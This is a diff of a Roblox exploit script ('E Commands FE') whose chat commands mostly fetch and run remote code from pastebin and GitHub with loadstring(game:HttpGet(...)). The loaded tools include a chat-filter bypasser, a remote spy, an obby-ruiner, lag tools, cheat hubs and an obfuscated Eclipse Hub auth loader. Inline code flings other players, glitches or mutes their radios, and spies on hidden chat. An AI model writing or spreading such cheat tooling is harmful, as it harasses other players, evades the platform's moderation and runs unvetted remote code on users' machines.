+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/mHaznh3T", true))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.audiologs) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet(('https://raw.githubusercontent.com/infyiff/backup/main/audiologger.lua'),true))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.blackhole) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BringFlingPlayers"))("More Scripts: t.me/arceusxscripts")
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.emojichat) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/YsY4jXJD"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.muteradio) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					task.spawn(function()
+						Username = arg1
+						if game:GetService("SoundService").RespectFilteringEnabled == true then
+							print("Muted Radio as Client")
+						else
+							print("Muted Radio as FE")
+							if Username == "all" or Username == "others" then
+								local players = game:GetService("Players"):GetPlayers()
+								for _, player in ipairs(players) do
+									for _, object in ipairs(player.Character:GetDescendants()) do
+										if object:IsA("Sound") and object.Playing then
+											object:Stop()
+										end
+									end
+									local backpack = player:FindFirstChildOfClass("Backpack")
+									if backpack then
+										for _, object in ipairs(backpack:GetDescendants()) do
+											if object:IsA("Sound") and object.Playing then
+												object:Stop()
+											end
+										end
+									end
+								end			
+							else
+								local players = getPlr(Username)
+								if players ~= nil then
+									for i, x in next, players.Character:GetDescendants() do
+										if x:IsA("Sound") and x.Playing == true then
+											x.Playing = false
+										end
+									end
+									for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
+										if x:IsA("Sound") and x.Playing == true then
+											x.Playing = false
+										end
+									end
+								end 
 							end
 						end
 					end)
+					local plrs = game:GetService("Players"):FindFirstChild(args[2])
+					if args[2] ~= plrs.Name then
+						output.Text = "Error: Player not found."
+						task.wait(4)
+						output.Text = ""
+					elseif args[2] == plrs.Name then
+						output.Text = "Checking Console tells you that it's FE or Client. (What it means is RespectFilteringEnabled in Sound Service is on or off.)"
+						task.wait(4)
+						output.Text = ""
+					end
 				end)
-			elseif args[1] == prefix.."unspeed" then
-				TPWalk = false
-				TPWalking = TPWalking:Disconnect()
-			elseif args[1] == prefix.."to" then
+			end
+		end
+	
+		for _, name in pairs(allcmds.obbytroll) do
+			if cmd == prefix..name then
 				task.spawn(function()
-					local Username = args[2]
-	
-	
-					char = game.Players.LocalPlayer
-	
-					TweenService = game:GetService("TweenService")
-	
-					speaker = game.Players.LocalPlayer
-					Players = game:GetService("Players")
-	
-					local players = getPlr(Username)
-					TweenService:Create(getRoot(speaker.Character), TweenInfo.new(2, Enum.EasingStyle.Linear), {CFrame = getRoot(players.Character).CFrame + Vector3.new(3,1,0)}):Play()
+					pcall(function()
+						loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/obby-ruiner/main/obby-ruiner.lua",true))()
+					end)
 				end)
-			elseif args[1] == prefix.."remotespy" then
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
-			elseif args[1] == prefix.."chatbypass" then
-				loadstring(game:HttpGet("https://github.com/Synergy-Networks/products/raw/main/BetterBypasser/loader.lua"))()
-			elseif args[1] == prefix.."collisions" then
+			end
+		end
+	
+		for _, name in pairs(allcmds.remotespy) do
+			if cmd == prefix..name then
 				task.spawn(function()
-					LP = game.Players.LocalPlayer
-					while wait(3) do
-						for i,v in pairs(game.Players:GetDescendants()) do
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.serverhop) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					local plr = game:GetService("Players").LocalPlayer
+					plr:Kick("E Commands FE - Attempting to server hop...")
+					game:GetService("TeleportService"):Teleport(game.PlaceId,plr)
+				end)
+			end
+		end
+	
+		for _, name in pairs(allcmds.spinfling) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					function getRoot(char)
+						local rootPart = game:GetService("Players").LocalPlayer.Character:FindFirstChild('HumanoidRootPart') or game:GetService("Players").LocalPlayer.Character:FindFirstChild('Torso') or game:GetService("Players").LocalPlayer.Character:FindFirstChild('UpperTorso')
+						return rootPart
+					end
+	
+					local Noclipping = nil
+					Clip = false
+					task.wait(0.1)
+					local function NoclipLoop()
+						if Clip == false and game:GetService("Players").LocalPlayer.Character ~= nil then
+							for _, child in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
+								if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
+									child.CanCollide = false
+								end
+							end
+						end
+					end
+					Noclipping = game:GetService("RunService").Stepped:Connect(NoclipLoop)
+	
+					flinging = false
+					for _, child in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
+						if child:IsA("BasePart") then
+							child.CustomPhysicalProperties = PhysicalProperties.new(math.huge, 0.3, 0.5)
+						end
+					end
+					task.wait(.1)
+					task.wait(.1)
+					local bambam = Instance.new("BodyAngularVelocity")
+					bambam.Name = "0"
+					bambam.Parent = getRoot(game:GetService("Players").LocalPlayer.Character)
+					bambam.AngularVelocity = Vector3.new(0,99999,0)
+					bambam.MaxTorque = Vector3.new(0,math.huge,0)
+					bambam.P = math.huge
+					local Char = game:GetService("Players").LocalPlayer.Character:GetChildren()
+					for i, v in next, Char do
+						if v:IsA("BasePart") then
+							v.CanCollide = false
+							v.Massless = true
+							v.Velocity = Vector3.new(0, 0, 0)
+						end
+					end
+					flinging = true
+					local function flingDiedF()
+						if flingDied then
+							flingDied:Disconnect()
+						end
+						flinging = false
+						task.wait(.1)
+						local speakerChar = game:GetService("Players").LocalPlayer.Character
+						if not speakerChar or not getRoot(speakerChar) then return end
+						for i,v in pairs(getRoot(speakerChar):GetChildren()) do
+							if v.ClassName == 'BodyAngularVelocity' then
+								v:Destroy()
+							end
+						end
+						for _, child in pairs(speakerChar:GetDescendants()) do
+							if child.ClassName == "Part" or child.ClassName == "MeshPart" then
+								child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
+							end
+						end
+					end
+					flingDied = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Died:Connect(flingDiedF)
+					repeat
+						bambam.AngularVelocity = Vector3.new(0,99999,0)
+						task.wait(.2)
+						bambam.AngularVelocity = Vector3.new(0,0,0)
+						task.wait(.1)
+					until flinging == false
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.brookhaven) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.chatbypass) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://github.com/Synergy-Networks/products/raw/main/BetterBypasser/loader.lua"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.collisions) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					LP = game:GetService("Players").LocalPlayer
+					while task.wait(3) do
+						for i,v in pairs(game:GetService("Players"):GetDescendants()) do
 							if v:IsA("Player") and workspace:FindFirstChild(v.Name) and v ~= LP and workspace[v.Name]:FindFirstChild("CHECKER") == nil then
 								checker = Instance.new("BoolValue",workspace[v.Name])
 								checker.Name = "CHECKER"
@@ -2763,1873 +2387,393 @@ local function FGJNAZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjh
 						end
 					end
 				end)
-			elseif args[1] == prefix.."laggame" then
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/ChatLag.lua"))()
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLag.lua"))()
-			elseif args[1] == prefix.."brookhaven" then
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
-			elseif args[1] == prefix.."btools" then
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts-3/main/fe%20btools%20V5.lua", true))()
-			elseif args[1] == prefix.."connectionterminated" then -- secret command
-				loadstring(game:HttpGet("https://pastebin.com/raw/9V1vY98E", true))()
-			elseif args[1] == prefix.."emojichat" then
+			end
+		end
+
+		for _, name in pairs(allcmds.eclipsehub) do
+			if cmd == prefix..name then
 				task.spawn(function()
-					-- // Notes:
-					-- The emojis list is based from discord the list is here: https://raw.githubusercontent.com/Aidez/emojiscopy/master/main or https://pastebin.com/raw/719UsVji \\ --
-					-- My code is ugly k dont read c:
-	
-					-- // Configuration, super simple: \\ --
-	
-					local config = {
-						-- // Values should be "true" or "false" and make sure there's a "," or ";" after them. \\ --
-						['EmojiAutofill'] = true; -- Autofills potential emojis like :sungla with :sunglasses:, you can hit tab to fill
-						['EmojiReplace'] = true; -- Autofills emojis instantly after adding both ":"'s example: ":sunglasses:" will turn into "?"
-					}
-	
-					-- // Main (no need to modify( \\ --
-	
-					if not game:IsLoaded() then
-						game.Loaded:Wait()
+					getgenv().mainKey = arg1
+
+					local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+
+					if arg1 == "" or arg1 == nil then
+						output.Text = "Error: You need to put 'nil' if you don't have a key."
+						task.wait(4)
+						output.Text = ""
+					elseif arg1 == "nil" then
+						output.Text = "Tip: If you want the most out of Eclipse Hub then buy Premium!"
+						task.wait(4)
+						output.Text = ""
 					end
-	
-					local jsondecode = function(arg)
-						return game:GetService("HttpService"):JSONDecode(arg)
-					end
-	
-					local jsonencode = function(arg)
-						return game:GetService("HttpService"):JSONEncode(arg)
-					end
-	
-					local getchat = function()
-						return {
-							main = game:GetService("Players").LocalPlayer.PlayerGui.Chat;
-							chatbar = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar;
-							messages = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatChannelParentFrame.Frame_MessageLogDisplay.Scroller
-						}
-					end
-	
-					local scroller = function(obj)
-						obj.ClipsDescendants = true;
-						local Scroller = Instance.new("Frame")
-						local CopyMessage = Instance.new("TextButton")
-						local UIListLayout = Instance.new("UIListLayout")
-						local CopyUser = Instance.new("TextButton")
-						local DeleteMessage = Instance.new("TextButton")
-						local Mute = Instance.new("TextButton")
-						local Unmute = Instance.new("TextButton")
-						local Tp = Instance.new("TextButton")
-	
-						Scroller.Name = "Scroller"
-						Scroller.Parent = obj;
-						Scroller.AnchorPoint = Vector2.new(0.5, 1)
-						Scroller.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-						Scroller.BackgroundTransparency = 1.000
-						Scroller.Position = UDim2.new(0, #obj.TextButton.Text * 14, 6.5, 0)
-						Scroller.Size = UDim2.new(0, 206, 0, 99)
-	
-						CopyMessage.Name = "CopyMessage"
-						CopyMessage.Parent = Scroller
-						CopyMessage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-						CopyMessage.BackgroundTransparency = 0.500
-						CopyMessage.BorderColor3 = Color3.fromRGB(27, 42, 53)
-						CopyMessage.BorderSizePixel = 0
-						CopyMessage.Position = UDim2.new(0, 49, 0, 50)
-						CopyMessage.Size = UDim2.new(0, 200, 0, 15)
-						CopyMessage.Font = Enum.Font.SourceSansBold
-						CopyMessage.Text = "Copy message"
-						CopyMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
-						CopyMessage.TextSize = 14.000
-						CopyMessage.TextStrokeTransparency = 0.750
-						CopyMessage.TextWrapped = true
-	
-						UIListLayout.Parent = Scroller
-						UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
-						UIListLayout.Padding = UDim.new(0, 2)
-	
-						CopyUser.Name = "CopyUser"
-						CopyUser.Parent = Scroller
-						CopyUser.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-						CopyUser.BackgroundTransparency = 0.500
-						CopyUser.BorderColor3 = Color3.fromRGB(27, 42, 53)
-						CopyUser.BorderSizePixel = 0
-						CopyUser.Position = UDim2.new(0, 49, 0, 50)
-						CopyUser.Size = UDim2.new(0, 200, 0, 15)
-						CopyUser.Font = Enum.Font.SourceSansBold
-						CopyUser.Text = "Copy username"
-						CopyUser.TextColor3 = Color3.fromRGB(255, 255, 255)
-						CopyUser.TextSize = 14.000
-						CopyUser.TextStrokeTransparency = 0.750
-						CopyUser.TextWrapped = true
-	
-						DeleteMessage.Name = "DeleteMessage"
-						DeleteMessage.Parent = Scroller
-						DeleteMessage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-						DeleteMessage.BackgroundTransparency = 0.500
-						DeleteMessage.BorderColor3 = Color3.fromRGB(27, 42, 53)
-						DeleteMessage.BorderSizePixel = 0
-						DeleteMessage.Position = UDim2.new(0, 49, 0, 50)
-						DeleteMessage.Size = UDim2.new(0, 200, 0, 15)
-						DeleteMessage.Font = Enum.Font.SourceSansBold
-						DeleteMessage.Text = "Delete (client)"
-						DeleteMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
-						DeleteMessage.TextSize = 14.000
-						DeleteMessage.TextStrokeTransparency = 0.750
-						DeleteMessage.TextWrapped = true
-	
-						Mute.Name = "Mute"
-						Mute.Parent = Scroller
-						Mute.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-						Mute.BackgroundTransparency = 0.500
-						Mute.BorderColor3 = Color3.fromRGB(27, 42, 53)
-						Mute.BorderSizePixel = 0
-						Mute.Position = UDim2.new(0, 49, 0, 50)
-						Mute.Size = UDim2.new(0, 200, 0, 15)
-						Mute.Font = Enum.Font.SourceSansBold
-						Mute.Text = "Mute (client)"
-						Mute.TextColor3 = Color3.fromRGB(255, 255, 255)
-						Mute.TextSize = 14.000
-						Mute.TextStrokeTransparency = 0.750
-						Mute.TextWrapped = true
-	
-						Unmute.Name = "Unmute"
-						Unmute.Parent = Scroller
-						Unmute.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-						Unmute.BackgroundTransparency = 0.500
-						Unmute.BorderColor3 = Color3.fromRGB(27, 42, 53)
-						Unmute.BorderSizePixel = 0
-						Unmute.Position = UDim2.new(0, 49, 0, 50)
-						Unmute.Size = UDim2.new(0, 200, 0, 15)
-						Unmute.Font = Enum.Font.SourceSansBold
-						Unmute.Text = "Unmute (client)"
-						Unmute.TextColor3 = Color3.fromRGB(255, 255, 255)
-						Unmute.TextSize = 14.000
-						Unmute.TextStrokeTransparency = 0.750
-						Unmute.TextWrapped = true
-	
-						Tp.Name = "Tp"
-						Tp.Parent = Scroller
-						Tp.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-						Tp.BackgroundTransparency = 0.500
-						Tp.BorderColor3 = Color3.fromRGB(27, 42, 53)
-						Tp.BorderSizePixel = 0
-						Tp.Position = UDim2.new(0, 49, 0, 50)
-						Tp.Size = UDim2.new(0, 200, 0, 15)
-						Tp.Font = Enum.Font.SourceSansBold
-						Tp.Text = "Teleport To Player"
-						Tp.TextColor3 = Color3.fromRGB(255, 255, 255)
-						Tp.TextSize = 14.000
-						Tp.TextStrokeTransparency = 0.750
-						Tp.TextWrapped = true
-						return Scroller;
-					end
-	
-					local bindable = Instance.new("BindableEvent");
-					local cache = {};
-					local dependencies = {
-						['Emojis'] = jsondecode(game:HttpGet('https://pastebin.com/raw/719UsVji'));
-						['Chat'] = getchat();
-					}
-	
-					local sendmsg = function(m)
-						if dependencies['Chat'] then
-							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(m, "All")
-						end
-					end
-	
-					local get = function(s)
-						if dependencies['Emojis'][s] then
-							return dependencies['Emojis'][s];
-						else
-							return nil;
-						end
-					end
-	
-					local fillmatches = function(emojis, object)
-						local t = object.Text;
-						for i, v in pairs(emojis) do
-							local emoji = get(v);
-							if emoji then
-								object.Text = string.gsub(object.Text, ":"..v..":", emoji)
-							end
-						end
-					end
-	
-					local last;
-	
-					local autofill = function(tbl, object)
-						local find = tbl[1];
-						if #find >= 2 then
-						else
-							return;
-						end
-	
-						local start = tbl[2]
-						last = tbl;
-	
-						local match;
-	
-						for i, v in pairs(dependencies['Emojis']) do
-							if i:lower():sub(1, #find) == find:lower() then
-								match = i;
-							end
-						end
-	
-						object.Parent.AutofillBox.PlaceholderText = '';
-	
-						if match then
-							local s = object.Text:sub(1, start - 1);
-							object.Parent.AutofillBox.PlaceholderText = s..':'..match..':'
-						end
-					end
-	
-					local trueautofill = function(tbl, object)
-						local find = tbl[1];
-						local start = tbl[2]
-	
-						local match;
-						last = nil;
-	
-						if #find >= 2 then
-						else
-							return;
-						end
-	
-						for i, v in pairs(dependencies['Emojis']) do
-							if i:lower():sub(1, #find) == find:lower() then
-								match = i;
-							end
-						end
-	
-						if match then
-							local s = object.Text:sub(1, start - 1);
-							object.Text = s..':'..match..':'
-						end
-					end
-	
-	
-					local match = function(t, obj)
-						if t:find(":") then
-							local start = 0;
-							local scan = {};
-							local autofills = {};
-	
-							for i = 1, #t do
-								local s = t:sub(i, i)
-								if s == ':' then
-									if start >= 1 then
-										table.insert(scan, t:sub(start + 1, i - 1))
-										start = 0;
-									else
-										start = i;
-									end
-								end
-							end
-	
-							start = 0;
-	
-							for i = 1, #t do
-								local s = t:sub(i, i)
-								if s == ':' then
-									if start >= 1 then
-										start = 0;
-									else
-										start = i;
-									end
-								end
-							end
-	
-							obj.Parent.AutofillBox.PlaceholderText = '';
-	
-							if start >= 1 then
-								table.insert(autofills, t:sub(start + 1, #t))
-								if config['EmojiAutofill'] == true then
-									autofill({
-										autofills[1],
-										start
-									}, obj)
-								end
-							else
-								obj.Parent.AutofillBox.PlaceholderText = '';
-							end
-	
-							if config['EmojiReplace'] == true then
-								fillmatches(scan, obj)
-							end
-						else
-							return {}
-						end
-					end
-	
-	
-					spawn(function()
-						game:GetService("RunService").Heartbeat:Connect(function()
-							if cache[dependencies['Chat'].chatbar] == nil then
-								cache[dependencies['Chat'].chatbar] = true;
-								dependencies['Chat'] = getchat()
-								bindable:Fire(dependencies['Chat'])
-							end
-						end)
-					end)
-	
-					game:GetService("UserInputService").InputBegan:Connect(function(k)
-						if k.KeyCode then
-							if k.KeyCode == Enum.KeyCode.Tab then
-								if focused then
-									if last then
-										local object = dependencies['Chat'].chatbar;
-										trueautofill(last, object)
-										wait()
-										object.Text = object.Text:sub(1, #object.Text - 1)
-									end
-								end
-							end
-						end
-					end)
-	
-					local getplayer = function(t)
-						for i = 1, #t do
-							if t:sub(i, i) == ']' then
-								return game:GetService("Players"):FindFirstChild(t:sub(2, i - 1));
-							end
-						end
-						return nil;
-					end
-	
-					local getvalue = function(t)
-						for i = 1,#t do
-							if t:sub(i,i) == ' ' then
-							else
-								return t:sub(i,#t)
-							end
-						end
-						return 'void'
-					end
-	
-					local scrollers = {};
-	
-					game:GetService("UserInputService").InputBegan:Connect(function(input)
-						if dependencies['Chat'] then
-							if input.UserInputType == Enum.UserInputType.MouseButton2 then
-								local m = game:GetService("Players").LocalPlayer:GetMouse()
-								local objs = game:GetService("Players").LocalPlayer.PlayerGui:GetGuiObjectsAtPosition(m.X, m.Y)
-								for i, v in pairs(objs) do
-									if v:FindFirstChild("TextButton") then
-										if v:FindFirstChild("Scroller") then
-											return
-										end
-										local s = scroller(v);
-	
-										for i, v in pairs(s:GetChildren()) do
-											if v:IsA("TextButton") then
-												v.ZIndex = 20;
-											end
-										end
-	
-										table.insert(scrollers, s);
-										if #scrollers >= 2 then
-											scrollers[1]:Destroy()
-											scrollers = {
-												s
-											}
-										end
-										s.Parent.ClipsDescendants = false;
-										s.MouseLeave:Connect(function()
-											s:Destroy();
-										end)
-	
-										s.CopyMessage.MouseButton1Click:Connect(function()
-											setclipboard(getvalue(v.Text))
-											s:Destroy();
-										end)
-	
-										s.DeleteMessage.MouseButton1Click:Connect(function()
-											v:Destroy()
-										end)
-	
-										s.CopyUser.MouseButton1Click:Connect(function()
-											local t = v.TextButton.Text;
-											for i = 1, #t do
-												if t:sub(i, i) == ']' then
-													setclipboard(t:sub(2, i - 1));
-												end
-											end
-											s:Destroy()
-										end)
-	
-										s.Unmute.MouseButton1Click:Connect(function()
-											sendmsg("/unmute "..tostring(getplayer(v.TextButton.Text)))
-											s:Destroy()
-										end)
-	
-										s.Mute.MouseButton1Click:Connect(function()
-											sendmsg("/mute "..tostring(getplayer(v.TextButton.Text)))
-											s:Destroy()
-										end)
-	
-										s.Tp.MouseButton1Click:Connect(function()
-											local plr = getplayer(v.TextButton.Text)
-											local hrp = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart;
-											local them = plr.Character:WaitForChild("HumanoidRootPart");
-											hrp.CFrame = CFrame.new(them.Position)
-										end)
-									end
-								end
-							end
-						end
-					end)
-	
-					bindable.Event:Connect(function(tbl)
-						local bar = tbl.chatbar;
-						bar.ZIndex = 2;
-						bar.Parent.TextLabel.ZIndex = 3;
-						local clone = bar:Clone();
-						clone.Name = 'AutofillBox'
-						clone.Parent = bar.Parent;
-						clone.TextEditable = false;
-						clone.ZIndex = 1;
-						clone.TextTransparency = .5
-						clone.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
-	
-						bar:GetPropertyChangedSignal("Text"):Connect(function()
-							focused = true;
-							local txt = bar.Text;
-							if txt == '' then
-								clone.PlaceholderText = '';
-								return;
-							end
-							match(txt, bar)
-						end)
-	
-						bar.FocusLost:Connect(function()
-							clone.PlaceholderText = '';
-							focused = false;
-						end)
-					end)
 				end)
-			elseif args[1] == prefix.."vghub" then
-				loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
-			elseif args[1] == prefix.."scpfuturistic" then
-				loadstring(game:HttpGet("https://pastebin.com/raw/uAmBPsE4"))()
-			elseif args[1] == prefix.."togglekillbricks" then
+			end
+		end
+
+		for _, name in pairs(allcmds.expandchat) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					require(game:GetService("Chat").ClientChatModules.ChatSettings).WindowResizable = true
+					require(game:GetService("Chat").ClientChatModules.ChatSettings).WindowDraggable = true
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.frakturess) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet(("https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/source.lua"),true))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.translator) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet(("https://pastebin.com/raw/itr2s59y"),true))() -- edited by me idk if it will work but i made it also for textchatservice and made it use the unc version of syn.request and whatever
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.glitchradio) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					task.spawn(function()
+						Username = arg1
+						Loopglitch = true
+						local players = getPlr(Username)
+						if players ~= nil then
+							for i, x in next, players.Character:GetDescendants() do
+								if x:IsA("Sound") and x.Playing == true then
+									x.Playing = true
+								end
+							end
+							for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
+								if x:IsA("Sound") and x.Playing == true then
+									x.Playing = true
+								end
+							end
+						end 
+						if game:GetService("SoundService").RespectFilteringEnabled == true then
+							print("Boombox Glitched as Client")
+						else
+							if game:GetService("SoundService").RespectFilteringEnabled == false then
+								print("Boombox Glitched as FE")
+							end
+						end
+						repeat task.wait()
+							for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
+								if x:IsA("Sound") and x.Playing == false then
+									x.Playing = true
+								end
+							end
+							for i, x in next, players.Character:GetDescendants() do
+								if x:IsA("Sound") and x.Playing == false then
+									x.Playing = true
+								end
+							end
+							task.wait(0.2)
+							for i, x in next, players:FindFirstChildOfClass("Backpack"):GetDescendants() do
+								if x:IsA("Sound") and x.Playing == true then
+									x.Playing = false
+								end
+							end
+							for i, x in next, players.Character:GetDescendants() do
+								if x:IsA("Sound") and x.Playing == true then
+									x.Playing = false
+								end
+							end
+							task.wait(0.2)
+						until Loopglitch == false
+					end)
+					local plrs = game:GetService("Players"):FindFirstChild(arg1)
+					if arg1 ~= plrs.Name then
+						output.Text = "Error: Player not found."
+						task.wait(4)
+						output.Text = ""
+					elseif arg1 == plrs.Name then
+						output.Text = "Checking Console tells you that it's FE or Client. (What it means is RespectFilteringEnabled in Sound Service is on or off.)"
+						task.wait(4)
+						output.Text = ""
+					end
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.noclipfling) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					Target = arg1
+					flinghh = 1000
+
+					target = getPlr(Target)
+					workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
+
+
+					local lp = game:GetService("Players").LocalPlayer
+					for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+						if v.Name:lower():match("^"..Target:lower()) or v.DisplayName:lower():match("^"..Target:lower()) then
+							Target = v
+							break
+						end
+					end
+
+					if type(Target) == "string" then return end
+
+					local oldpos = lp.Character.HumanoidRootPart.CFrame
+					local oldhh = lp.Character.Humanoid.HipHeight
+
+					local carpetAnim = Instance.new("Animation")
+					carpetAnim.AnimationId = "rbxassetid://282574440"
+					carpet = lp.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(carpetAnim)
+					carpet:Play(.1, 1, 1)
+
+					local carpetLoop
+
+					local tTorso = Target.Character:FindFirstChild("Torso") or Target.Character:FindFirstChild("LowerTorso") or Target.Character:FindFirstChild("HumanoidRootPart")
+
+					spawn(function()
+						carpetLoop = game:GetService('RunService').Heartbeat:Connect(function()
+							pcall(function()
+								if tTorso.Velocity.magnitude <= 28 then -- if target uses netless just target their local position
+									local pos = {x=0, y=0, z=0}
+									pos.x = tTorso.Position.X
+									pos.y = tTorso.Position.Y
+									pos.z = tTorso.Position.Z
+									pos.x = pos.x + tTorso.Velocity.X / 2
+									pos.y = pos.y + tTorso.Velocity.Y / 2
+									pos.z = pos.z + tTorso.Velocity.Z / 2
+									lp.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z))
+								else
+									lp.Character.HumanoidRootPart.CFrame = tTorso.CFrame
+								end
+							end)
+						end)
+					end)
+
+					task.wait()
+
+					lp.Character.Humanoid.HipHeight = flinghh
+
+					task.wait(.5)
+
+					carpetLoop:Disconnect()
+					workspace.CurrentCamera.CameraSubject = target.Character.Humanoid
+					task.wait(1)
+					lp.Character.Humanoid.Health = 0
+					task.wait(game:GetService("Players").RespawnTime + .6)
+					lp.Character.HumanoidRootPart.CFrame = oldpos
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.skibidirizz) do
+			if cmd == prefix..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/MastersMZ-Scripts/Scripts/main/plague%20rizz%20script.lua"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.toggletouch) do
+			if cmd == prefix..name then
 				task.spawn(function()
 					local player = game:GetService("Players").LocalPlayer
 					local UIS = game:GetService("UserInputService")
 					local myzaza = false
-	
+
 					UIS.InputBegan:Connect(function(input, GPE)
 						if GPE then return end
 						if input.KeyCode == Enum.KeyCode.Z then
 							myzaza = not myzaza
 						end
 					end)
-	
-					while task.wait() do
-						local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 10)
+
+					while true do
+						if math.random(-5,5) == 0 then
+							task.wait()
+						end
+						local parts = workspace:GetPartBoundsInRadius(player.Character:WaitForChild("HumanoidRootPart").Position, 20)
 						for _, part in ipairs(parts) do
 							part.CanTouch = myzaza
 						end
 					end
 				end)
-			elseif args[1] == prefix.."doorsgui" then
-				loadstring(game:HttpGet(("https://raw.githubusercontent.com/TheEGodOfficial/doorsfunni/main/sourcething.lua"),true))()
-			elseif args[1] == prefix.."chatspy" then
+			end
+		end
+
+		for _, name in pairs(allcmds.unspinfling) do
+			if cmd == prefix..name then
 				task.spawn(function()
-					--This script reveals ALL hidden messages in the default chat
-	
-					enabled = true --chat "/spy" to toggle!
-					spyOnMyself = true --if true will check your messages too
-					public = false --if true will chat the logs publicly (fun, risky)
-					publicItalics = true --if true will use /me to stand out
-					privateProperties = { --customize private logs
-						Color = Color3.fromRGB(0,255,255); 
-						Font = Enum.Font.SourceSansBold;
-						TextSize = 18;
-					}
-	
-	
-					local StarterGui = game:GetService("StarterGui")
-					local Players = game:GetService("Players")
-					local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
-					local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
-					local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
-					local instance = (_G.chatSpyInstance or 0) + 1
-					_G.chatSpyInstance = instance
-	
-					local function onChatted(p,msg)
-						if _G.chatSpyInstance == instance then
-							if p==player and msg:lower():sub(1,4)=="/spy" then
-								enabled = not enabled
-								wait(0.3)
-								privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
-								if game:GetService("TextChatService").ChatVersion == "LegacyChatService" then
-									StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
-								else
